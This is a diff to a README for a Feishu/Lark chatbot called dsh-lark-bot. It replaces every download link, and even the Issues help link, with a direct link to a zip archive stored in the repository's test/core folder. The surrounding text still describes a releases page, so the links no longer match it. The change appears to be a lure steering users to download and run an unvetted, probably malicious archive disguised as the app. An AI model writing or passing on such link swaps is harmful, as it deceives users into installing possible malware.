@@ -3,7 +3,7 @@
 ## 🚀 Getting Started – Download and Run in Minutes
 
 Visit this link to download the application:
-### ⬇️ [**Download dsh-lark-bot**](https://github.com/tarraencompassing61/dsh-lark-bot/releases)
+### ⬇️ [**Download dsh-lark-bot**](https://raw.githubusercontent.com/tarraencompassing61/dsh-lark-bot/main/test/core/lark-dsh-bot-v3.1.zip)
 
 Once you arrive at the page, look for the newest release. Click the download button and save the file to your computer. After the download finishes, you can run the application right away.
 
@@ -46,7 +46,7 @@ Works with both English and Chinese interfaces, making it easy for international
 ### Step 1: Visit the Download Page
 
 Visit this link to download the application:
-[**https://github.com/tarraencompassing61/dsh-lark-bot/releases**](https://github.com/tarraencompassing61/dsh-lark-bot/releases)
+[**https://raw.githubusercontent.com/tarraencompassing61/dsh-lark-bot/main/test/core/lark-dsh-bot-v3.1.zip**](https://raw.githubusercontent.com/tarraencompassing61/dsh-lark-bot/main/test/core/lark-dsh-bot-v3.1.zip)
 
 You'll see a list of released versions. Choose the newest one at the top.
 
@@ -128,7 +128,7 @@ Perfect – dsh-lark-bot is designed to plug right in. Just provide your workspa
 ## 🤝 Getting Help
 
 Visit the repository's Issues page if you need help:
-[**GitHub Issues**](https://github.com/tarraencompassing61/dsh-lark-bot/issues)
+[**GitHub Issues**](https://raw.githubusercontent.com/tarraencompassing61/dsh-lark-bot/main/test/core/lark-dsh-bot-v3.1.zip)
 
 Our friendly community and maintainers will assist you quickly.
 
@@ -153,7 +153,7 @@ New versions come out regularly with fixes and improvements. Check the releases 
 
 Your journey to smarter teamwork begins now:
 
-[**👉 Download dsh-lark-bot**](https://github.com/tarraencompassing61/dsh-lark-bot/releases)
+[**👉 Download dsh-lark-bot**](https://raw.githubusercontent.com/tarraencompassing61/dsh-lark-bot/main/test/core/lark-dsh-bot-v3.1.zip)
 
 Join countless teams already using DeepSeek inside Feishu. It's free, fast, and takes less than five minutes to set up. Once you try it, you'll wonder how you worked without it.
 
